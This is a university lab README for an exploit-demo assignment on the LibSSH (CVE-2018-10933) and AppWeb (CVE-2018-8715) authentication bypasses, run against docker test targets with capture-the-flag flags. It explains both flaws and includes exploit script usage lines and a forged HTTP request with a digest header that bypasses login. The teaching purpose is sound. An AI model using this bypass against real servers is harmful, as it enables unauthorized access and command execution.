# FEP3370 Exploit Demo Assignment (Authentication Bypass) 

> **Student Name:** Valency Oscar Colaco, Linköping University (valency.colaco@liu.se)

This assignment demonstrates known vulnerabilities in LibSSH (before versions 0.7.6 and 0.8.4) and Embedthis's AppWeb (before version 7.0.3) related to flawed implementation logic (Improper Authentication) and bugs in the source code. A malicious attacker can craft a specifically designed payload to bypass the authentication process and execute commands on the server/application.  

## Special Notes

To make this assignment more interactive, I embedded flags inside the vulnerable components that you can capture. All the scripts have been tested on Ubuntu 20.04 (Focal) on cloud servers provided by the Ericsson Research Datacenter (ERDC) in WASP (also known as WARA-Common). 

## Dependencies (Attacker)

Run these commands with superuser priveleges on a local Linux (Ubuntu or Kali) machine

```bash
sudo apt-get update
sudo apt-get install python3-pip --assume-yes
pip3 install paramiko
git clone https://github.com/valency007/fep3370-exploit-demo-assignment.git
cd fep3370-exploit-demo-assignment
ls
```

## Installation of Vulnerable Components (Cloud)

This build script will pull the vulnerable components from [Vulhub](https://github.com/vulhub/vulhub), build and deploy them as docker containers. You will also need to modify your cloud server's port security settings to allow Ingress connections on ports 2222 and 3333. This script was tested on Ubuntu 20.04 (Focal)

```bash
git clone https://github.com/valency007/fep3370-exploit-demo-assignment.git
cd fep3370-exploit-demo-assignment
chmod +x build.sh
./build.sh
```

If the script executes without any errors, and the docker containers are up and running, the installation was successful

### Installation Screencast 

The following video demonstrates the installation process on the Cloud Virtual Machine Instance (kindly right click and open link in new tab)

[![IMAGE_ALT](https://img.youtube.com/vi/s1WrJ4QhDrk/maxresdefault.jpg)](https://www.youtube.com/watch?v=s1WrJ4QhDrk)

## LibSSH Vulnerability Description

LibSSH is a multiplatform C library implementing the SSHv2 protocol on the client and server sides. With LibSSH, you can remotely execute programs, transfer files, use a secure and transparent tunnel, manage public keys and much more. A vulnerability was found in LibSSH's server-side state machine before versions 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, resulting in unauthorized access. It can also allow anyone to gain unfettered administrative control of a vulnerable server. This vulnerability was discovered by Peter Winter-Smith of NCC Group and is known as CVE-2018-10933 with a Severity Score of 9.1 (Critical, CVSS 3.x metrics)

The vulnerability makes it possible to log in without any credentials by presenting a server with a `SSH2_MSG_USERAUTH_SUCCESS` message rather than the `SSH2_MSG_USERAUTH_REQUEST` message the server was expecting. Normally, in a typical connection, the user sends an `SSH2_MSG_USERAUTH_REQUEST` that contains the client’s username and authentication data, such as a password. When the server validates this content, it allows the connection. The problem is when a user sends an `SSH2_MSG_USERAUTH_SUCCESS`, the SSH server opens up a channel, thereby allowing the execution of code or transfer of data without any authentication credentials. 

## About the Attack Script

Paramiko is used because it is a Python implementation of the SSHv2 protocol, providing both client and server functionality. It would send the `SSH2_MSG_USERAUTH_SUCCESS` to take advantage of the vulnerability.

A socket to the vulnerable LibSSH server would be opened. After that, a Paramiko client would be started pointing to the socket and an `SSH2_MSG_USERAUTH_SUCCESS` would be sent. After establishing the connection, your input command(s) will be sent and the response will be parsed.

## Run the Attack Script

```bash
chmod +x exploit-ssh.py
./exploit-ssh.py [target IP] [SSH port] ["commands"]
```

```bash
Usage Example: ./exploit-ssh.sh 129.167.56.21 22 "ls && ls /home/ubuntu"
```

### Attack Screencast

The following video demonstrates the attack against the vulnerable LibSSH Server (kindly right click and open link in new tab)

[![IMAGE_ALT](https://img.youtube.com/vi/CjQ7nEpuh5Q/maxresdefault.jpg)](https://www.youtube.com/watch?v=CjQ7nEpuh5Q)

## AppWeb Vulnerability Description

The Embedthis HTTP library, and Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. With a forged HTTP request, it is possible to bypass authentication for the form and digest login types.

Due to a logical flaw in the authentication procedure, knowing the target username, it is possible to completely bypass authentication of both form and digest type authentications, by means of a crafted HTTP POST request. This vulnerability was discovered by Davide Quarta, an independent security researcher and Truel IT, and is known as CVE-2018-8715 with a Severity Score of 8.1 (High, CVSS 3.x metrics)  

**The issue lies in the file -  http/httpLib.c, in the functions authCondition() and httpGetCredentials()**. The first function is responsible for calling the two functions that are responsible for authentication: getCredentials, and httpLogin. The second function receives two pointers to char arrays that will contain the username and password parsed from the request. Since there are no checks in authCondition, it doesn’t matter if the “parseAuth” function fails, this means we can insert in the WWW-Authenticate header or the post data for authentication any field we want.

## About the Attack Script

The current username is `admin`, so you can use following request to bypass the authentication:

```
GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin
```

## Run the Attack Script

You can either use [Burp Suite](https://portswigger.net/burp) or you can use the automated python script below,

```bash
chmod +x exploit-web.py
./exploit-ssh.py [target IP] [WebApp port] ["username"]
```

```bash
Usage Example: ./exploit-web.sh 129.167.56.21 80 "admin"
```

If the exploit is successful, you will get a session cookie which you can inject into Mozilla Firefox or Google Chrome using the console to capture the flag! 

### Attack Screencast

The following video demonstrates the attack against the vulnerable WebApp server. This video shows the two ways to exploit the server - using Burp Suite and the automated python script (kindly right click and open link in new tab)

[![IMAGE_ALT](https://img.youtube.com/vi/fhir_YNbRjI/maxresdefault.jpg)](https://www.youtube.com/watch?v=fhir_YNbRjI)

## Credits
[Vulhub](https://github.com/vulhub/vulhub) -  Pre-Built Vulnerable Environments Based on Docker-Compose <br />
[Davide Quarta and Truel IT](https://ssd-disclosure.com/ssd-advisory-appweb-authentication-bypass-digest-and-forms/) for discovering CVE-2018-8715 <br />
[Peter Winter-Smith](https://www.libssh.org/security/advisories/CVE-2018-10933.txt) for discovering CVE-2018-10933 <br />
[Ericsson Research Datacenter (ERDC)](https://wasp-sweden.org/research/research-arenas/) for providing the Cloud Testing Infrastructure <br /> 
Python scripts for the automated exploits were adapted from the Vulhub repositories [here](https://github.com/vulhub/vulhub/tree/master/appweb/CVE-2018-8715) and [here](https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933) <br />

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change. I would recommend you to get in touch first (at valency.colaco@liu.se) before you dedicate your time and resources.

## License
All code is licensed under the [MIT](https://choosealicense.com/licenses/mit/) License.
